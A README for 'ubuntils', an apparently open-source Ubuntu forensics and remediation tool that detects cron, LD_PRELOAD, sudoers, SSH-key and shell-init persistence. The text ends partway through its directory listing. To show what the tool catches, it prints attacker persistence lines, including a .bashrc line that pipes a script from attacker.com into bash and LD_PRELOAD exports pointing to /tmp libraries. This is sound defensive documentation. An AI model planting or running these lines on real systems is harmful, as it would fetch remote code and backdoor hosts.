# ubuntils - Ubuntu Incident Response Forensics Tool

Fast, native Linux forensics for rapid Ubuntu system triage, persistence detection, and automated remediation. Built to solve a real gap in incident response workflows.

![Build Status](https://img.shields.io/badge/status-development-yellow)
![Python](https://img.shields.io/badge/python-3.9+-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Tested On](https://img.shields.io/badge/tested-amd64%20|%20x86__64%20|%20arm64-brightgreen)
![Ubuntu](https://img.shields.io/badge/ubuntu-20.04%20|%2022.04%20|%2024.04-orange)

---

## Table of Contents

1. [The Problem](#the-problem)
2. [How ubuntils Solves It](#how-ubuntils-solves-it)
3. [How It Works](#how-it-works)
4. [What It Detects](#what-it-detects)
5. [Installation](#installation)
6. [Quick Start](#quick-start)
7. [Detailed Usage Guide](#detailed-usage-guide)
8. [Getting the Most Out of ubuntils](#getting-the-most-out-of-ubuntils)
9. [Example Outputs](#example-outputs)
10. [Architecture](#architecture)
11. [Performance](#performance)
12. [Testing & Compatibility](#testing--compatibility)
13. [Security Considerations](#security-considerations)
14. [Roadmap](#roadmap)
15. [Contributing](#contributing)
16. [License](#license)

---

## The Problem

### The Gap in Incident Response

During a DFIR course and while building a home SOC (Security Operations Center) around tools like Wazuh, Velociraptor, MISP, and Shuffle, I ran into a frustrating problem that most incident responders know well:

**Most forensics tools require Windows, or are so fragmented on Linux that triage becomes a manual, error-prone grind.**

Specifically:
- **EnCase, Autopsy, FTK** — Windows-first. Running these on Linux means emulation, remote access, or VM overhead just to start the job.
- **Volatility 3** — Excellent for memory forensics, but requires a pre-captured memory dump. No live system triage.
- **Manual approach** — Chain together `ps`, `lsof`, `netstat`, grep through multiple log files, manually check cron jobs, sudoers, SSH keys, LD_PRELOAD... the list goes on.

Meanwhile, production infrastructure is overwhelmingly Linux:
- Most web servers, cloud VMs, containers, and CI/CD runners run Ubuntu
- Yet the forensics tooling for Ubuntu specifically is sparse, outdated, or requires heavy setup

### The Real Workflow Pain

When a Ubuntu system gets compromised, this is what incident response looks like in practice:

```
1.  SSH into the system
2.  Run `ps aux --forest`              → Manually scan process tree
3.  Run `netstat -tlpn`                → Check for unexpected ports
4.  Run `lsof -i`                      → Look for suspicious connections
5.  Manually read /var/log/syslog      → Look for anomalies
6.  Manually read /var/log/auth.log    → Check login attempts + failures
7.  Read journalctl output             → Cross-reference systemd events
8.  Check /etc/cron.d/* + crontabs     → Find cron-based persistence
9.  Check /etc/systemd/system/         → Find suspicious timers or services
10. Read /etc/sudoers + /etc/sudoers.d → Look for NOPASSWD abuse
11. Check ~/.ssh/authorized_keys       → Find backdoor SSH keys
12. Read ~/.bashrc, ~/.zshrc           → Look for LD_PRELOAD or shell hooks
13. Check /etc/ld.so.preload           → Find rootkit injection points
14. Manually correlate timestamps      → Try to build a timeline
15. Write a report                     → Document everything found
```

This process:
- Takes **30 to 40 minutes per system**
- Is **inconsistent** across analysts (different people check different things)
- Is **error-prone** (easy to miss something under pressure)
- Produces **no standardized output** (every analyst formats reports differently)
- Has **no automation** for remediation (fixes are manual file edits with no backup)

The problem is not that tools don't exist individually. `ps` works. `grep` works. The problem is that nothing ties them together intelligently for Ubuntu-specific incident response, runs natively on Linux, detects persistence automatically, and remediates safely.

That is what ubuntils is built to fix.

---

## How ubuntils Solves It

### One Tool. One Command. Complete Triage.

ubuntils consolidates the entire manual workflow into a single native CLI tool:

```bash
sudo ubuntils scan
```

That one command:

1. **Collects all relevant artifacts** from the live system in parallel
2. **Applies 8 detection rules** specifically built for Ubuntu persistence mechanisms
3. **Builds a chronological timeline** by correlating events across logs
4. **Generates a structured report** in human-readable or JSON format
5. **Flags severity levels** (HIGH, MEDIUM, LOW) with recommendations

And when you're ready to act:

```bash
sudo ubuntils scan --remediate --dry-run    # Preview fixes first
sudo ubuntils scan --remediate --confirm    # Apply with backups
sudo ubuntils rollback /var/backups/ubuntils_TIMESTAMP/    # Undo if needed
```

### What Changes

| | Manual Process | ubuntils |
|---|---|---|
| Time per system | 30-40 minutes | ~5 seconds |
| Consistency | Analyst-dependent | Standardized rules |
| Persistence detection | Manual checklist | Automated (8 rules) |
| Timeline | Manual correlation | Auto-built from logs |
| Remediation | Manual file editing | Automated with backups |
| Output | No standard format | Human-readable + JSON |
| Rollback | No backup strategy | Timestamped + one command |
| Error risk | High under pressure | Minimal (rules-based) |

### Design Principles

**Native Linux first.** No emulation, no Windows dependency, no external GUI tools. ubuntils runs where your infrastructure runs.

**Speed without sacrifice.** Parallel artifact collection means you get results in seconds, not minutes. But speed never comes at the cost of thoroughness.

**Safety-first remediation.** Auto-fixing a compromised system can make things worse if done wrong. Every remediation action in ubuntils creates a timestamped backup, validates changes before applying, and provides a one-command rollback.

**Open and auditable.** Detection rules are not black boxes. Every rule is documented, readable, and community-improvable. You know exactly why something is flagged.

**Integration ready.** JSON output is designed to feed directly into SIEM, MISP, TheHive, or any other tool in your incident response stack.

---

## How It Works

### The Pipeline

ubuntils processes every scan in a structured pipeline:

```
User Command
      │
      ▼
┌─────────────────────────────────────────────────────────────────┐
│  CLI Layer (Click)                                              │
│  Parse flags: --output, --remediate, --dry-run, --confirm       │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Artifact Collection (runs in parallel)                         │
│                                                                 │
│  ProcessCollector     LogCollector        FilesystemCollector   │
│  ├─ ps aux            ├─ /var/log/syslog  ├─ /etc/cron.d/*      │
│  ├─ lsof -i           ├─ /var/log/auth    ├─ user crontabs      │
│  └─ netstat -tlpn     ├─ journalctl       ├─ /etc/sudoers       │
│                       └─ auditd logs      ├─ authorized_keys    │
│  UserCollector                            ├─ .bashrc / .zshrc   │
│  ├─ /etc/passwd                           └─ /etc/ld.so.preload │
│  ├─ /etc/group                                                  │
│  └─ login activity                                              │
│                                                                 │
│  Output: Structured dict of all collected artifacts             │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Persistence Detection (rule engine)                            │
│                                                                 │
│  Apply 8 rules against collected artifacts                      │
│  Score each finding: HIGH / MEDIUM / LOW                        │
│  Attach recommendation + remediation availability               │
│                                                                 │
│  Output: findings[] with severity, path, command, recommendation│
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  Timeline Builder                                               │
│                                                                 │
│  Correlates events across all log sources by timestamp          │
│  Produces chronological narrative of what happened              │
│                                                                 │
│  Output: Ordered list of timestamped events                     │
└──────────────────────────────┬──────────────────────────────────┘
                               │
               ┌───────────────┴───────────────┐
               │                               │
               ▼ (if --remediate)              ▼ (always)
┌──────────────────────────┐   ┌───────────────────────────────┐
│  Remediation Engine      │   │  Output Formatter             │
│                          │   │                               │
│  BackupManager           │   │  HumanFormatter               │
│  ├─ Create timestamp dir │   │  ├─ Tables + headers          │
│  └─ Copy original files  │   │  ├─ Severity labels           │
│                          │   │  └─ Recommendations           │
│  RemediationModules      │   │                               │
│  ├─ cron_remediation     │   │  JSONFormatter                │
│  ├─ sudoers_remediation  │   │  ├─ Structured output         │
│  ├─ ssh_remediation      │   │  └─ SIEM/MISP ready           │
│  ├─ ld_preload_remediation│  │                               │
│  └─ shell_remediation    │   └───────────────────────────────┘
│                          │
│  RollbackManager         │
│  └─ Restore from backup  │
└──────────────────────────┘
```

### Step 1: Artifact Collection

Each collector runs independently and returns structured data. They run in parallel so the total collection time is bounded by the slowest collector, not the sum.

**ProcessCollector**

Runs `ps aux --forest` to capture the full process tree including parent-child relationships. Runs `lsof -i` to capture open network connections per process. Runs `netstat -tlpn` and `netstat -tnp` to get listening ports and established connections.

This tells you what is running, what it is connected to, and whether the process tree has any unusual parent-child relationships (for example, a web server spawning a shell).

**LogCollector**

Parses `/var/log/syslog`, `/var/log/auth.log`, `journalctl` output, and `/var/log/audit/audit.log` (if auditd is running). Each log source uses a different parsing strategy because the formats differ significantly between syslog text, binary journal, and audit records.

The output is a flat list of timestamped events sorted chronologically, ready for timeline building.

**FilesystemCollector**

Reads every relevant persistence location on the system:
- `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly,monthly}/`, and user crontabs via `crontab -u <user> -l`
- `/etc/systemd/system/*.timer` and `.service` files
- `/etc/sudoers` and all files in `/etc/sudoers.d/`
- `~/.ssh/authorized_keys` for all users with home directories
- `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` for each user
- `/etc/ld.so.preload` and environment LD_PRELOAD values

**UserCollector**

Reads `/etc/passwd` and `/etc/group` to build a picture of all users, their UIDs, their shells, and their group memberships. Also checks `last`, `lastlog`, and `who` for recent login activity.

### Step 2: Persistence Detection

The rule engine takes the collected artifacts and applies 8 rules. Each rule is a function that checks one specific condition against the artifact data and returns a finding if the condition is met.

Rules are intentionally conservative. The goal is high recall with low false positives. A finding is only generated when there is a concrete, specific reason to flag it, not on vague heuristics.

See [What It Detects](#what-it-detects) for a full breakdown of every rule.

### Step 3: Timeline Building

The timeline builder takes all log events from the LogCollector and sorts them by timestamp. It then correlates events that are close in time and involve the same user, process, or file to produce a readable narrative of what happened.

For example, if the logs show a SSH login at 14:00, a sudo execution at 14:05, and a file modification at 14:10, the timeline presents these as a sequence rather than three unrelated events.

### Step 4: Remediation (Optional)

When `--remediate` is passed, the remediation engine runs after detection. It takes the findings list and applies fixes only to findings that have `remediation_available: true`.

Every remediation module follows the same pattern:
1. Identify the exact artifact to modify
2. Create a timestamped backup in `/var/backups/ubuntils/TIMESTAMP/`
3. Validate the change before applying (e.g., syntax check for sudoers)
4. Apply the change
5. Verify the change was applied correctly
6. Log the action with the backup path and rollback command

If any step fails, the module stops and reports the failure without leaving the system in a partially modified state.

### Step 5: Output

The formatter takes findings, timeline, artifact statistics, and remediation status and produces either a human-readable report or structured JSON.

---

## What It Detects

### Rule 1: Cron Root Execution (HIGH)

**What it checks:** User crontabs where a non-root user has entries that run as root or execute commands that require root.

**Why it matters:** An attacker who has compromised a non-root account can plant a cron job that executes as root, giving them repeated privilege escalation without needing to exploit anything again.

**Example:**
```
User: ubuntu
Cron: */5 * * * * /tmp/check_disk.sh
Problem: /tmp path + runs with root privileges via SUID or sudo
```

**Auto-fix:** Remove the cron entry. Backup created at `/var/spool/cron/crontabs/ubuntu.backup.TIMESTAMP`.

---

### Rule 2: Cron /tmp Paths (HIGH)

**What it checks:** Any cron job (system or user) that references a path in `/tmp`, `/var/tmp`, or `/dev/shm`.

**Why it matters:** These directories are world-writable. Legitimate software never needs cron jobs pointing to `/tmp`. An attacker stages malware there because it is always writable and often not monitored as closely as system directories.

**Example:**
```
Cron entry: */1 * * * * /tmp/update_check.sh
Path: /tmp (world-writable, execution every minute)
```

**Auto-fix:** Remove the cron entry.

---

### Rule 3: LD_PRELOAD Injection (HIGH)

**What it checks:** LD_PRELOAD set in `/etc/ld.so.preload` or in any user's shell initialization files, pointing to a library outside of standard system library paths.

**Why it matters:** LD_PRELOAD forces a shared library to be loaded into every process before any other library. This is the mechanism behind many Linux rootkits and credential harvesters. It lets an attacker intercept system calls, hide files, or steal credentials transparently.

**Example:**
```
/etc/ld.so.preload contains: /tmp/libhook.so
OR
~/.bashrc contains: export LD_PRELOAD=/var/tmp/logger.so
```

**Auto-fix:** Comment out the LD_PRELOAD line. Original file backed up before modification.

---

### Rule 4: Sudoers NOPASSWD (MEDIUM)

**What it checks:** Any sudoers entry that grants NOPASSWD access to a non-root, non-system user.

**Why it matters:** NOPASSWD means an attacker who compromises that account can immediately run any allowed command as root without knowing the user's password. This is a common persistence mechanism because it survives reboots and is often overlooked in post-incident cleanup.

**Example:**
```
ubuntu ALL=(ALL) NOPASSWD: /usr/bin/apt-get
OR
%wheel ALL=(ALL) NOPASSWD: ALL
```

**Auto-fix:** Remove the NOPASSWD clause. Validated with `visudo -cf` before applying. Backup created.

---

### Rule 5: Shell Initialization Hijacking (MEDIUM)

**What it checks:** Shell initialization files (`.bashrc`, `.zshrc`, `.bash_profile`, `.profile`) that contain suspicious patterns: downloads via curl/wget, LD_PRELOAD exports, base64-decoded execution, or reverse shell patterns.

**Why it matters:** Shell init files run every time a user opens a terminal or logs in. An attacker can plant a reverse shell or credential harvester here that re-executes on every login without any cron job needed.

**Example:**
```
.bashrc contains:
export LD_PRELOAD=/tmp/liblogger.so
curl -s http://attacker.com/implant.sh | bash
```

**Auto-fix:** Comment out the suspicious lines. Backup created before modification.

---

### Rule 6: SSH Key Injection (HIGH)

**What it checks:** Entries in `~/.ssh/authorized_keys` for all users that do not match a whitelist of known keys (if configured) or that were added recently based on file modification timestamps.

**Why it matters:** Adding an SSH key is the cleanest possible backdoor. The attacker can log in silently, no password needed, even after the original exploit is patched. Many incident responders forget to check authorized_keys for every user, not just root.

**Example:**
```
~/.ssh/authorized_keys contains:
ssh-rsa AAAAB3Nz... unknown-key@attacker
```

**Auto-fix:** Remove the unrecognized key entry. Backup of the full authorized_keys file created first.

---

### Rule 7: Non-Standard Systemd Services (MEDIUM)

**What it checks:** Systemd service files in non-standard locations (anywhere other than `/etc/systemd/system/`, `/usr/lib/systemd/system/`, `/lib/systemd/system/`) or service files whose `ExecStart` points to paths in `/tmp`, `/home`, `/var/tmp`, or `/dev/shm`.

**Why it matters:** Attackers create systemd services for persistence because they survive reboots and run with specified user permissions. They place them in writable locations to avoid needing root for creation but still get automatic execution.

**Example:**
```
/tmp/malicious.service
[Service]
ExecStart=/tmp/backdoor
Restart=always
```

**Auto-fix:** Not available (flagged only). Manual review required because disabling a service automatically can break legitimate software if the rule produces a false positive here.

---

### Rule 8: System File Modification Timestamps (MEDIUM)

**What it checks:** Critical system files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/hosts`) whose modification timestamp is more recent than the system's last known clean state or more recent than a configurable threshold (default: 30 days).

**Why it matters:** Legitimate systems do not have their `/etc/passwd` modified regularly. A recent modification means either a new user was added, a password was changed, or an attacker modified it directly. This is often how attackers add backdoor accounts or escalate privileges.

**Example:**
```
/etc/passwd last modified: 5 days ago
/etc/shadow last modified: 5 days ago (unusual for stable system)
```

**Auto-fix:** Not available (flagged only). The change may be legitimate (an admin added a user). Manual review is required before any modification.

---

## Installation

### Requirements

- **Operating System:** Ubuntu 20.04 LTS, 22.04 LTS, or 24.04 LTS
- **Architecture:** x86-64 (amd64) or ARM64 (arm64) — both fully supported
- **Python:** 3.9 or higher
- **Permissions:** Root or sudo access required for full artifact collection

### From Source (Recommended)

```bash
# Clone the repository
git clone https://github.com/asmitdesai/ubuntils.git
cd ubuntils

# Create a virtual environment
python3 -m venv venv
source venv/bin/activate

# Install ubuntils in development mode
pip install -e .

# Verify the installation
ubuntils --version
ubuntils --help
```

### From PyPI (Coming Soon)

```bash
pip install ubuntils
```

### Dependencies

ubuntils has minimal external dependencies by design. All heavy lifting uses standard Linux system commands via subprocess.

```
click>=8.1.0          # CLI framework and argument parsing
pyyaml>=6.0           # Configuration file support
python-dateutil>=2.8  # Robust date and time parsing across log formats
tabulate>=0.9.0       # Clean table formatting for human-readable output
loguru>=0.7.0         # Structured logging with file and stream handlers
```

---

## Quick Start

### Your First Scan

```bash
# Basic detection scan (read-only, no changes made)
sudo ubuntils scan
```

This runs a full artifact collection, applies all 8 detection rules, builds a timeline, and prints a human-readable report to stdout.

### Save the Report

```bash
# Save report to a file
sudo ubuntils scan --output /tmp/triage_report.txt

# Get JSON output (for SIEM or scripting)
sudo ubuntils scan --output json

# JSON to file
sudo ubuntils scan --output json > /tmp/findings.json
```

### Preview Remediation

```bash
# See what WOULD be fixed without making any changes
sudo ubuntils scan --remediate --dry-run
```

This is always the recommended first step before applying any fixes. The dry-run output shows exactly what files would be modified, what changes would be made, and where backups would be created.

### Apply Remediation

```bash
# Apply fixes with backups (after reviewing dry-run output)
sudo ubuntils scan --remediate --confirm
```

### Rollback

```bash
# If something went wrong, restore the original state
sudo ubuntils rollback /var/backups/ubuntils_20240615_142345/
```

---

## Detailed Usage Guide

### Detection Mode

Detection mode is the default. It reads artifacts from the system but makes no changes.

```bash
# Standard human-readable report
sudo ubuntils scan

# JSON output for integration
sudo ubuntils scan --output json

# Save to specific file
sudo ubuntils scan --output /path/to/report.txt

# Combine JSON output with file save
sudo ubuntils scan --output json > /path/to/findings.json

# Verbose mode (debug-level logging)
sudo ubuntils scan -v
```

### Remediation Mode

Remediation mode must be explicitly enabled with `--remediate`. It has two sub-modes: dry-run and confirm.

```bash
# Always start with dry-run to see what would change
sudo ubuntils scan --remediate --dry-run

# Apply fixes after reviewing dry-run
sudo ubuntils scan --remediate --confirm

# Remediate and save report
sudo ubuntils scan --remediate --confirm --output /tmp/remediation_report.txt

# Remediate and output JSON status
sudo ubuntils scan --remediate --confirm --output json
```

### Rollback Mode

If remediation caused an unexpected issue, rollback restores all modified files from their timestamped backups.

```bash
# List available backups
sudo ubuntils rollback --list

# Rollback entire remediation session
sudo ubuntils rollback /var/backups/ubuntils_20240615_142345/

# Rollback and verify (scans system after restoring)
sudo ubuntils rollback /var/backups/ubuntils_20240615_142345/ --verify
```

### Flags Reference

| Flag | Description | Default |
|------|-------------|---------|
| `--output human` | Human-readable report to stdout | Default |
| `--output json` | JSON output to stdout | Off |
| `--output /path/file` | Save report to file | Off |
| `--remediate` | Enable remediation engine | Off |
| `--dry-run` | Preview changes, no modification | Off |
| `--confirm` | Apply changes with backups | Off |
| `-v / --verbose` | Enable debug logging | Off |

---

## Getting the Most Out of ubuntils

### Recommended Workflow for Incident Response

This is the recommended end-to-end workflow when you suspect a system is compromised:

**Step 1: Initial Triage (Read-Only)**

```bash
# Run detection-only scan first
# This makes no changes and gives you the full picture
sudo ubuntils scan
```

Read through the output carefully. Pay attention to:
- All HIGH severity findings (act on these first)
- The timeline (understand the sequence of events)
- The artifact statistics (how many cron jobs, SSH keys, etc.)

**Step 2: Save Evidence**

```bash
# Save findings as JSON for your incident record
sudo ubuntils scan --output json > /tmp/initial_triage_$(hostname)_$(date +%Y%m%d_%H%M%S).json
```

Always save your initial scan before remediating. The JSON output captures the state of the system at the time of triage.

**Step 3: Preview Remediation**

```bash
# See exactly what ubuntils will do before it does it
sudo ubuntils scan --remediate --dry-run
```

Review the dry-run output carefully. For each proposed change, ask yourself:
- Is this finding definitely malicious, or could it be legitimate?
- Is the backup path correct?
- Does the rollback command look right?

Do not skip the dry-run. It takes 5 seconds and can save you from breaking a production system.

**Step 4: Apply Remediation Selectively**

```bash
# When you're confident, apply the fixes
sudo ubuntils scan --remediate --confirm
```

After applying, note the backup directory printed in the output. You will need this path if you need to rollback.

**Step 5: Verify**

```bash
# Scan again to confirm findings are resolved
sudo ubuntils scan
```

The findings that were remediated should no longer appear (or should appear as resolved). If any HIGH findings remain, they were either flagged as manual-review-only or the fix was not applied correctly.

**Step 6: Send to Your SIEM or Ticketing System**

```bash
# Export final clean state as JSON
sudo ubuntils scan --output json > /tmp/post_remediation_$(hostname)_$(date +%Y%m%d_%H%M%S).json

# Or pipe directly to your SIEM ingestion endpoint
sudo ubuntils scan --output json | curl -X POST -H "Content-Type: application/json" \
  -d @- http://your-siem-endpoint/api/incidents
```

---

### Integrating with Your Security Stack

**With MISP**

ubuntils JSON output maps cleanly to MISP event attributes. The `findings` array contains IOCs (file paths, commands, key fingerprints) that can be imported as MISP attributes for threat intelligence correlation.

```bash
# Capture findings
sudo ubuntils scan --output json > findings.json

# Extract IOCs for MISP (example using jq)
cat findings.json | jq '.findings[] | select(.severity == "HIGH") | {path: .path, command: .command}'
```

**With Wazuh**

ubuntils can be run as a custom Wazuh active response script or as a scheduled command. The JSON output can be ingested into Wazuh as a custom log source for centralized alerting.

**With TheHive**

The JSON report structure maps to TheHive observables. Each finding becomes an observable with its severity as a tag, the path as the value, and the recommendation as a note.

**With Velociraptor**

ubuntils complements Velociraptor well. Run Velociraptor hunts to collect memory artifacts and network forensics, and run ubuntils for live system artifact collection and persistence detection on Ubuntu endpoints.

---

### Tips for Better Results

**Run as root, not just sudo.** While sudo works for most collection, running as root ensures that every artifact location is readable, including `/proc/[pid]/environ` and `/etc/shadow`.

**Run the scan before rebooting.** A reboot clears running processes, in-memory connections, and temporary files that ubuntils collects. Always triage first.

**Save your JSON output.** The JSON report is your forensic record. Store it with your incident ticket. If you are ever asked what state the system was in at the time of triage, you have the exact answer.

**Use dry-run on production systems.** On production systems that you cannot take down, run detection-only or use `--dry-run` before any remediation. Confirm each fix with your team before applying.

**Understand what manual-review means.** Rules 7 and 8 (non-standard services and file timestamp anomalies) are flagged but not auto-fixed. This is intentional: these findings require human judgment. A recently modified `/etc/passwd` could be an attacker adding a backdoor user, or it could be an admin legitimately creating an account. ubuntils tells you to look. You decide what to do.

**Test remediation in your lab first.** If you have never run ubuntils with `--confirm` before, test it on a lab system first. Intentionally plant a cron job, run the scan, apply the fix, and verify rollback works. This builds confidence before you use it in a real incident.

---

## Example Outputs

### Human-Readable Report (Detection)

```
===== UBUNTU FORENSICS TRIAGE REPORT =====
Generated:    2024-06-15 14:23:45 UTC
Hostname:     web-server-01
Kernel:       5.15.0-101-generic
Uptime:       45 days
Scan Mode:    DETECTION ONLY
Scan Duration: 4.82 seconds

----- EXECUTION SUMMARY -----
Artifacts Collected: 847
Findings:            5 (2 HIGH, 2 MEDIUM, 1 LOW)
Remediation Available: 4 of 5 findings

----- SUSPICIOUS FINDINGS -----

[HIGH] Cron Root Execution by Non-Root User
  ID:              FINDING_001
  Location:        /var/spool/cron/crontabs/ubuntu
  Owner:           ubuntu
  Command:         /tmp/check_disk.sh
  Interval:        */5 * * * * (every 5 minutes)
  Last Modified:   2024-06-10 14:32:15 UTC (5 days ago)
  Why suspicious:  Non-root user cron executing /tmp path with elevated context
  Auto-Fix:        AVAILABLE (remove cron entry)
  Recommendation:  Investigate /tmp/check_disk.sh immediately

[HIGH] LD_PRELOAD Injection in Shell Init File
  ID:              FINDING_002
  Location:        /home/ubuntu/.bashrc
  Type:            Environment variable export
  Value:           LD_PRELOAD=/tmp/libx.so
  File Modified:   2024-06-10 09:15:22 UTC (5 days ago)
  Why suspicious:  LD_PRELOAD outside standard library paths; rootkit indicator
  Auto-Fix:        AVAILABLE (comment out LD_PRELOAD line)
  Recommendation:  Examine /tmp/libx.so; likely credential harvester or rootkit

[MEDIUM] Sudoers NOPASSWD Entry for Unprivileged User
  ID:              FINDING_003
  Location:        /etc/sudoers
  User:            ubuntu
  Entry:           ubuntu ALL=(ALL) NOPASSWD: /usr/bin/apt-get
  Why suspicious:  Passwordless sudo allows instant privilege escalation
  Auto-Fix:        AVAILABLE (remove NOPASSWD clause)
  Recommendation:  Verify if this was intentionally configured

[MEDIUM] Unexpected SSH Key in authorized_keys
  ID:              FINDING_004
  Location:        /home/ubuntu/.ssh/authorized_keys
  Key Type:        ssh-rsa
  Key Comment:     unknown@host
  File Modified:   2024-06-10 14:45:00 UTC (5 days ago)
  Why suspicious:  Key added recently; origin unknown
  Auto-Fix:        AVAILABLE (remove unknown key entry)
  Recommendation:  Verify key ownership; remove if not recognized

[LOW] Critical System File Modified Recently
  ID:              FINDING_005
  Location:        /etc/passwd
  Modified:        2024-06-10 12:45:30 UTC (5 days ago)
  Why suspicious:  /etc/passwd is rarely modified on stable systems
  Auto-Fix:        NOT AVAILABLE (manual review required)
  Recommendation:  Run `diff /etc/passwd /etc/passwd.bak` and check for new accounts

----- TIMELINE (Last 48 Hours) -----
2024-06-15 14:00:22 | SSH LOGIN     | ubuntu     | from 203.0.113.45 (SUCCESS)
2024-06-15 14:03:01 | SUDO          | ubuntu     | /usr/bin/apt-get update
2024-06-15 14:05:44 | FILE MODIFIED | ubuntu     | /home/ubuntu/.bashrc
2024-06-15 14:08:30 | CRON ADDED    | root       | /tmp/check_disk.sh (every 5 min)
2024-06-15 14:10:00 | CRON RAN      | root       | /tmp/check_disk.sh
2024-06-15 14:15:33 | FILE MODIFIED | root       | /etc/passwd
2024-06-15 14:40:01 | SSH ATTEMPT   | unknown    | from 203.0.113.50 (FAILED x5)
2024-06-15 15:00:00 | CRON RAN      | root       | /tmp/check_disk.sh
2024-06-15 15:05:12 | SSHD          | system     | MaxAuthTries exceeded; 203.0.113.50 disconnected

----- ARTIFACT STATISTICS -----
Processes:          142 total (3 suspicious)
Network:            24 total (8 listening, 16 established)
Cron Jobs:          8 total (1 suspicious)
Systemd Timers:     5 total (0 suspicious)
Auth Events:        342 total (87 success, 255 failed)
SSH Keys:           3 total (1 suspicious)
Sudoers Entries:    12 total (1 NOPASSWD)

----- NEXT STEPS -----
Immediate:
  1. Review and remove /tmp/check_disk.sh
  2. Examine /tmp/libx.so for malicious code
  3. Remove unauthorized SSH key from authorized_keys
  4. Fix sudoers NOPASSWD entry

When ready to remediate:
  sudo ubuntils scan --remediate --dry-run     (preview fixes)
  sudo ubuntils scan --remediate --confirm     (apply with backups)
```

---

### Human-Readable Report (After Remediation)

```
===== UBUNTU FORENSICS REMEDIATION REPORT =====
Generated:    2024-06-15 14:31:20 UTC
Hostname:     web-server-01
Scan Mode:    REMEDIATION (--confirm)
Backup Dir:   /var/backups/ubuntils_20240615_143120/

----- REMEDIATION APPLIED -----

[OK] FINDING_001 - Cron Root Execution
  Action:    Removed cron entry for /tmp/check_disk.sh
  Backup:    /var/backups/ubuntils_20240615_143120/crontabs_ubuntu
  Validated: Entry no longer present in crontab
  Status:    SUCCESS

[OK] FINDING_002 - LD_PRELOAD Injection
  Action:    Commented out LD_PRELOAD line in /home/ubuntu/.bashrc
  Change:    export LD_PRELOAD=/tmp/libx.so
             → # export LD_PRELOAD=/tmp/libx.so  (ubuntils 2024-06-15)
  Backup:    /var/backups/ubuntils_20240615_143120/ubuntu_.bashrc
  Status:    SUCCESS

[OK] FINDING_003 - Sudoers NOPASSWD
  Action:    Removed NOPASSWD clause from sudoers entry
  Validated: visudo syntax check passed
  Backup:    /var/backups/ubuntils_20240615_143120/sudoers
  Status:    SUCCESS

[OK] FINDING_004 - SSH Key Injection
  Action:    Removed unrecognized SSH key from authorized_keys
  Backup:    /var/backups/ubuntils_20240615_143120/ubuntu_authorized_keys
  Status:    SUCCESS

[SKIPPED] FINDING_005 - System File Modification
  Reason:    Manual review required; no auto-fix available

----- ROLLBACK COMMAND -----
To restore all files to their original state:
  sudo ubuntils rollback /var/backups/ubuntils_20240615_143120/

----- VERIFICATION -----
Run another scan to confirm findings are resolved:
  sudo ubuntils scan
```

---

### JSON Output

```json
{
  "metadata": {
    "timestamp": "2024-06-15T14:23:45Z",
    "hostname": "web-server-01",
    "kernel": "5.15.0-101-generic",
    "uptime_days": 45,
    "scan_duration_seconds": 4.82,
    "ubuntils_version": "1.0.0",
    "scan_mode": "detection"
  },
  "summary": {
    "artifacts_collected": 847,
    "findings": {
      "high": 2,
      "medium": 2,
      "low": 1,
      "total": 5
    },
    "remediation_available": 4
  },
  "findings": [
    {
      "id": "FINDING_001",
      "severity": "HIGH",
      "category": "cron_root_execution",
      "title": "Cron Root Execution by Non-Root User",
      "path": "/var/spool/cron/crontabs/ubuntu",
      "owner": "ubuntu",
      "command": "/tmp/check_disk.sh",
      "details": {
        "cron_interval": "*/5 * * * *",
        "last_modified": "2024-06-10T14:32:15Z",
        "days_since_modified": 5
      },
      "why_suspicious": "Non-root user cron executing /tmp path with elevated context",
      "remediation": {
        "available": true,
        "type": "cron_removal",
        "action": "Remove cron entry"
      },
      "recommendation": "Investigate /tmp/check_disk.sh immediately"
    },
    {
      "id": "FINDING_002",
      "severity": "HIGH",
      "category": "ld_preload_injection",
      "title": "LD_PRELOAD Injection in Shell Init File",
      "path": "/home/ubuntu/.bashrc",
      "details": {
        "type": "environment_variable",
        "value": "LD_PRELOAD=/tmp/libx.so",
        "file_modified": "2024-06-10T09:15:22Z",
        "days_since_modified": 5
      },
      "why_suspicious": "LD_PRELOAD outside standard library paths; rootkit indicator",
      "remediation": {
        "available": true,
        "type": "shell_cleanup",
        "action": "Comment out LD_PRELOAD line"
      },
      "recommendation": "Examine /tmp/libx.so for malicious behavior"
    }
  ],
  "timeline": [
    {
      "timestamp": "2024-06-15T14:00:22Z",
      "event_type": "ssh_login",
      "user": "ubuntu",
      "source_ip": "203.0.113.45",
      "status": "success"
    },
    {
      "timestamp": "2024-06-15T14:05:44Z",
      "event_type": "file_modified",
      "user": "ubuntu",
      "path": "/home/ubuntu/.bashrc"
    },
    {
      "timestamp": "2024-06-15T14:08:30Z",
      "event_type": "cron_added",
      "user": "root",
      "command": "/tmp/check_disk.sh"
    }
  ],
  "artifacts": {
    "processes": { "total": 142, "suspicious": 3 },
    "network": { "total": 24, "listening": 8, "established": 16 },
    "cron_jobs": { "total": 8, "suspicious": 1 },
    "systemd_timers": { "total": 5, "suspicious": 0 },
    "auth_events": { "total": 342, "successful": 87, "failed": 255 },
    "ssh_keys": { "total": 3, "suspicious": 1 },
    "sudoers_entries": { "total": 12, "nopasswd": 1 }
  }
}
```

---

## Architecture

### Directory Structure

```
ubuntils/
├── ubuntils/
│   ├── __init__.py
│   ├── cli.py                       # Click CLI entry point, commands, flags
│   ├── collectors/
│   │   ├── __init__.py
│   │   ├── processes.py             # ps, lsof, netstat collection
│   │   ├── logs.py                  # syslog, auth, journal, auditd parsing
│   │   ├── filesystem.py            # cron, sudoers, SSH, shell, LD_PRELOAD
│   │   └── users.py                 # passwd, group, login activity
│   ├── detectors/
│   │   ├── __init__.py
│   │   ├── persistence.py           # 8 detection rules
│   │   └── anomalies.py             # Timeline anomaly detection
│   ├── remediators/
│   │   ├── __init__.py
│   │   ├── cron_remediation.py      # Cron job removal
│   │   ├── sudoers_remediation.py   # Sudoers NOPASSWD fix
│   │   ├── ssh_remediation.py       # SSH key removal
│   │   ├── ld_preload_remediation.py # LD_PRELOAD cleanup
│   │   ├── shell_remediation.py     # Shell init file cleanup
